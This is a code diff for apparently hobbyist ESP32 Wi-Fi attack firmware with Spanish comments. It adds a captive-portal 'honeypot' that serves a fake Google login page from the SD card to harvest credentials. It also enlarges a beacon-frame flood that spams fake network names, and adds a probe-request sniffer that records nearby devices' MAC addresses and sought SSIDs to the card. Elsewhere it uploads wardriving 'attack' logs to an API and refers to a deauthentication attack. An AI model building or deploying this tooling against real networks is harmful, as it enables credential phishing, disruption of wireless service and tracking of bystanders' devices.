@@ -9,6 +9,7 @@
 #include "joystick_module.h"
 #include "joystick_module.h"
 #include "sd_module.h"
+#include "conexion_api.h"
 
 #define JOY_UP  12
 #define JOY_DOWN    33
@@ -42,7 +43,9 @@ void menuWardriving(bool &dentroDeOpcion); // NUEVO: WARDRIVING
 void startHoneypot(int plantilla);
 void flujoServidorDatos(bool &dentroDeOpcion);
 void scanNetworks();
+void conectarRedAutoDesdeSD(String ssidObjetivo);
 String generarHTML(int plantilla); 
+
 
 
 /////|INICIA EL MODULO WIFI EN EL MAIN|
@@ -52,6 +55,20 @@ void setupWiFi() {
     Serial.println("Modulo WiFi listo");
 }
 
+//////by wifi
+String leerHTMLdesdeSD(String path) {
+  File archivo = SD.open(path);
+  String contenido = "";
+  if (archivo) {
+    while (archivo.available()) {
+      contenido += (char)archivo.read();
+    }
+    archivo.close();
+  } else {
+    contenido = "<h1>Error: Archivo no encontrado en SD</h1>";
+  }
+  return contenido;
+}
 
 /////|MENU DEL MODULO WIFI|
 void flujoWiFi(bool &dentroDeOpcion) {
@@ -224,7 +241,19 @@ void menuWardriving(bool &dentroDeOpcion) {
     u8g2.sendBuffer();
     delay(2000);
     dentroDeOpcion = false;
+    // === ENVIAR LOG A LA API ===
+    u8g2.clearBuffer();
+    u8g2.drawStr(0, 30, "Subiendo Log...");
+    u8g2.sendBuffer();
+    
+    iniciarWiFi(); // Se reconecta temporalmente al router de tu casa
+    // Enviamos: Módulo, Detalles del ataque + cantidad de paquetes, Duración ficticia o fija
+    enviarLogAPI("WiFi_Wardriving", "Captura_PCAP_Paquetes_" + String(paquetesWardriving), paquetesWardriving);
+    
+    WiFi.disconnect(); // Desconectamos para dejar el módulo limpio
+    dentroDeOpcion = false;
 }
+
 
 // ========================================================
 // MENÚ Y ATAQUE DE DESAUTENTICACIÓN (DEAUTH)
@@ -427,8 +456,14 @@ void startHoneypot(int plantilla) {
     u8g2.sendBuffer();
 
     servidorHoneypot.on("/", [plantilla]() {
-        servidorHoneypot.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+    servidorHoneypot.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+    
+    if (plantilla == 0) { // Si eliges Google en el menú
+        String htmlGoogle = leerHTMLdesdeSD("/pagina_google.html");
+        servidorHoneypot.send(200, "text/html", htmlGoogle);
+    } else {
         servidorHoneypot.send(200, "text/html", generarHTML(plantilla));
+    }
     });
 
     servidorHoneypot.on("/generate_204", []() {
@@ -490,7 +525,7 @@ void scanNetworks() {
 
     int n = WiFi.scanNetworks();
     
-    if (n == 0) {
+    if (n == 0) { 
         u8g2.clearBuffer();
         u8g2.drawStr(10, 30, "0 redes :(");
         u8g2.sendBuffer();
@@ -499,39 +534,76 @@ void scanNetworks() {
         int indiceRed = 0;
         bool viendoRedes = true;
         
+        // Esperar a que el usuario suelte el botón si venía presionado de antes
+        while(digitalRead(JOY_SW) == LOW) { yield(); }
+        delay(100);
+
         while(viendoRedes) {
             u8g2.clearBuffer();
             u8g2.setFont(u8g2_font_6x12_tr);
             u8g2.setCursor(0, 10);
-            u8g2.print("Redes: "); u8g2.print(n);
+            u8g2.print("Redes encontradas: "); u8g2.print(n);
 
-            // Mostramos un máximo de 3 redes simultáneas en la pantalla OLED
-            for(int i = 0; i < 3; i++) {
-                int index = indiceRed + i;
-                if(index < n) {
-                    int yPos = 30 + (i * 12);
-                    // Flecha indicadora en el primer elemento visible
-                    if (i == 0) u8g2.drawStr(0, yPos, ">"); 
-                    
-                    u8g2.setCursor(10, yPos);
-                    String ssid = WiFi.SSID(index);
-                    // Recortamos el nombre si es muy largo para que no se salga de la pantalla
-                    if(ssid.length() > 12) ssid = ssid.substring(0, 12) + "..";
-                    
-                    u8g2.print(ssid);
-                    u8g2.print(" (");
-                    u8g2.print(WiFi.RSSI(index)); // Fuerza de la señal
-                    u8g2.print(")");
+            // Determinar la ventana de visualización (desplazamiento vertical)
+            int inicioVista = 0;
+            if (indiceRed >= 4) {
+                inicioVista = indiceRed - 3; // Mantiene el cursor visible abajo
+            }
+
+            // Mostramos hasta 4 redes en la pantalla
+            for(int i = 0; i < 4; i++) {
+                int indexReal = inicioVista + i;
+                if(indexReal >= n) break;
+
+                int yPos = 25 + (i * 12);
+                
+                // Si esta es la red apuntada por el joystick, dibujamos la flecha
+                if (indexReal == indiceRed) {
+                    u8g2.drawStr(0, yPos, ">"); 
                 }
+                
+                u8g2.setCursor(10, yPos);
+                String ssid = WiFi.SSID(indexReal);
+                if(ssid.length() > 14) ssid = ssid.substring(0, 14) + "..";
+                
+                u8g2.print(ssid);
+                u8g2.print(" (");
+                u8g2.print(WiFi.RSSI(indexReal)); 
+                u8g2.print(")");
             }
             u8g2.sendBuffer();
 
-        if (digitalRead(JOY_UP) == LOW) { if (indiceRed > 0) indiceRed--; delay(150); }
-        if (digitalRead(JOY_DOWN) == LOW) { if (indiceRed < n - 1) indiceRed++; delay(150); }
-        if (digitalRead(JOY_SW) == LOW) { delay(250); viendoRedes = false; }
+            // --- MOVIMIENTO DEL JOYSTICK ---
+            if (digitalRead(JOY_UP) == LOW) { 
+                if (indiceRed > 0) indiceRed--; 
+                delay(150); 
+            }
+            if (digitalRead(JOY_DOWN) == LOW) { 
+                if (indiceRed < n - 1) indiceRed++; 
+                delay(150); 
+            }
+            
+            // --- SELECCIÓN DE RED (CLICK) ---
+            if (digitalRead(JOY_SW) == LOW) { 
+                delay(50); // Pequeño delay de estabilización
+                
+                // Guardamos el SSID exacto antes de cerrar nada
+                String redSeleccionada = WiFi.SSID(indiceRed);
+                
+                // Esperar obligatoriamente a que sueltes el botón físico 
+                // para que no se herede el click al menú de atrás
+                while(digitalRead(JOY_SW) == LOW) { yield(); }
+                delay(200); 
+
+                // Ejecutamos la conexión
+                conectarRedAutoDesdeSD(redSeleccionada);
+                
+                viendoRedes = false; // Rompemos el bucle para regresar
+            }
+            yield();
         }
     }
-    // Liberar la memoria RAM del escaneo
+    // Liberar la memoria del escaneo antes de salir
     WiFi.scanDelete();
 }
 
@@ -547,9 +619,21 @@ uint8_t beacon_frame[109] = {
 
 void ssidSpamReal() {
     //Por el momento nomas lanza 3 para aumentar el numero de flood agregar mas nombres y modificar el numero aqui
-    const char *ssids[] = {"ERROR_404_NET", "Free_WiFi_Hotspot", "Hackeado_ESP32"};
+    const char *ssids[] = {"ERROR_404_NETO", "Free_WiFi_Hotspot", "Hackeado_ESP32","ERROR_404_NET", 
+        "Free_WiFi_HotspotO", 
+        "Hackeado_ESP320",
+        "WiFi_Gratis",
+        "Zona_Infectada",
+        "No_Conectar",
+        "Virus_Detected",
+        "FBI_Surveillance",
+        "CiberSeguridad",
+        "ESP32_Test",
+        "Red_Fantasma",
+        "Internet_Libre",
+        "Canal_Privado"};
     //AQUI modifica segun el numero de reds que deseas
-    int num_ssids = 3;
+    int num_ssids = sizeof(ssids) / sizeof(ssids[0]);
     WiFi.mode(WIFI_STA);
     WiFi.disconnect();
     u8g2.clearBuffer(); u8g2.setFont(u8g2_font_ncenB08_tr); u8g2.drawStr(0, 15, "Spamming SSIDs..."); u8g2.sendBuffer();
@@ -560,34 +644,148 @@ void ssidSpamReal() {
             esp_wifi_set_channel(canal, WIFI_SECOND_CHAN_NONE);
             beacon_frame[10] = beacon_frame[16] = random(256);
             int ssid_len = strlen(ssids[i]);
+
+            if(ssid_len > 32) ssid_len = 32; 
+            
             beacon_frame[37] = ssid_len;
-            for (int j = 0; j < ssid_len; j++) beacon_frame[38 + j] = ssids[i][j];
+            for (int j = 0; j < ssid_len; j++) {
+                beacon_frame[38 + j] = ssids[i][j];
+            }
             esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, 38 + ssid_len, true);
+
+            delay(2);
         }
         canal++; if (canal > 11) canal = 1;
         if (digitalRead(32) == LOW) { delay(200); atacando = false; }
         yield(); 
+    
+        delay(10);
     }
 }
 
+//
+///    Conectar Red BY:HK
+//
+void conectarRedAutoDesdeSD(String ssidObjetivo) {
+    u8g2.clearBuffer();
+    u8g2.setFont(u8g2_font_6x12_tr);
+    u8g2.drawStr(0, 20, "Buscando clave...");
+    u8g2.setCursor(0, 40); u8g2.print(ssidObjetivo);
+    u8g2.sendBuffer();
+
+    // Abrimos el archivo usando la librería estándar que ya maneja tu setupSD
+    File archivoClaves = SD.open("/WIFI/claves.txt", FILE_READ);
+    if (!archivoClaves) {
+        u8g2.clearBuffer();
+        u8g2.drawStr(0, 25, "ERROR: No existe");
+        u8g2.drawStr(0, 40, "/WIFI/claves.txt");
+        u8g2.sendBuffer();
+        delay(2500);
+        return;
+    }
+
+    String passwordEncontrada = "";
+    bool claveEncontrada = false;
+
+    // Procesamos el archivo línea por línea buscando coincidencias
+    while (archivoClaves.available()) {
+        String linea = archivoClaves.readStringUntil('\n');
+        linea.trim(); // Limpia retornos de carro (\r) o espacios vacíos
+        
+        int separador = linea.indexOf(',');
+        if (separador != -1) {
+            String ssidTxt = linea.substring(0, separador);
+            String passTxt = linea.substring(separador + 1);
+            
+            // Si el SSID del archivo coincide con el seleccionado en el escaneo
+            if (ssidTxt == ssidObjetivo) {
+                passwordEncontrada = passTxt;
+                claveEncontrada = true;
+                break;
+            }
+        }
+    }
+    archivoClaves.close();
+
+    if (!claveEncontrada) {
+        u8g2.clearBuffer();
+        u8g2.drawStr(0, 25, "Red no guardada");
+        u8g2.drawStr(0, 40, "en claves.txt");
+        u8g2.sendBuffer();
+        delay(2500);
+        return;
+    }
+
+    // Inicializar intento de conexión STA
+    u8g2.clearBuffer();
+    u8g2.drawStr(0, 20, "Conectando...");
+    u8g2.setCursor(0, 40); u8g2.print(ssidObjetivo);
+    u8g2.sendBuffer();
+
+    WiFi.mode(WIFI_STA);
+    WiFi.begin(ssidObjetivo.c_str(), passwordEncontrada.c_str());
+
+    int intentos = 0;
+    // Máximo 15 segundos de espera (30 * 500ms)
+    while (WiFi.status() != WL_CONNECTED && intentos < 30) {
+        delay(500);
+        u8g2.drawStr((intentos % 5) * 6, 55, ".");
+        u8g2.sendBuffer();
+        intentos++;
+    }
+
+    u8g2.clearBuffer();
+    if (WiFi.status() == WL_CONNECTED) {
+        u8g2.drawStr(0, 20, "NET CONECTADA!");
+        u8g2.setCursor(0, 40); u8g2.print("IP:" + WiFi.localIP().toString());
+    } else {
+        u8g2.drawStr(0, 30, "Fallo de tiempo");
+        u8g2.drawStr(0, 45, "Revisa la clave");
+        WiFi.disconnect();
+    }
+    u8g2.sendBuffer();
+    delay(3500);
+}
+
+/////// modificado by:hk
 void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
     wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
     uint8_t *payload = pkt->payload;
+    
     if (payload[0] == 0x40) {
         paquetesCapturados++;
         char macStr[18];
-        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", payload[10], payload[11], payload[12], payload[13], payload[14], payload[15]);
+        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", 
+                 payload[10], payload[11], payload[12], payload[13], payload[14], payload[15]);
         ultimaMacSniffed = String(macStr);
+        
         int ssid_len = payload[25];
         if (ssid_len > 0 && ssid_len <= 32) {
             char ssidStr[33]; memcpy(ssidStr, &payload[26], ssid_len); ssidStr[ssid_len] = '\0';
             ultimoSSIDBuscado = String(ssidStr);
+        } else {
+            ultimoSSIDBuscado = "<Oculto/Broadcast>";
         }
+
+        // Vinculamos la nueva función del módulo SD
+        extern void guardarLogSniffer(String mac, String ssid);
+        
+        // Ejecutamos el guardado limpio
+        guardarLogSniffer(ultimaMacSniffed, ultimoSSIDBuscado);
     }
 }
 
 void probeSnifferReal() {
-    u8g2.clearBuffer(); u8g2.setFont(u8g2_font_ncenB08_tr); u8g2.drawStr(0, 20, "SNIFFER ACTIVO"); u8g2.sendBuffer();
+    u8g2.clearBuffer(); u8g2.setFont(u8g2_font_ncenB08_tr); 
+    u8g2.drawStr(0, 20, "Iniciando SD..."); 
+    u8g2.sendBuffer();
+
+    // Verificación rápida de la SD
+    if (!SD.exists("/WIFI")) {
+        SD.mkdir("/WIFI");
+    }
+
+    u8g2.clearBuffer(); u8g2.setFont(u8g2_font_ncenB08_tr); u8g2.drawStr(0, 20, "SNIFFER ACTIVO + SD"); u8g2.sendBuffer();
     WiFi.mode(WIFI_STA); WiFi.disconnect();
     esp_wifi_set_promiscuous(true); esp_wifi_set_promiscuous_rx_cb(&snifferCallback);
     bool escuchando = true; uint8_t canal = 1; unsigned long uCanal = millis(); unsigned long uPantalla = millis();
@@ -601,7 +799,7 @@ void probeSnifferReal() {
             u8g2.setCursor(0, 60); u8g2.print(ultimoSSIDBuscado);
             u8g2.sendBuffer(); uPantalla = millis();
         }
-        if (digitalRead(32) == LOW) { delay(200); escuchando = false; }
+        if (digitalRead(JOY_SW)== LOW) { delay(200); escuchando = false; }
         yield();
     }
     esp_wifi_set_promiscuous(false);
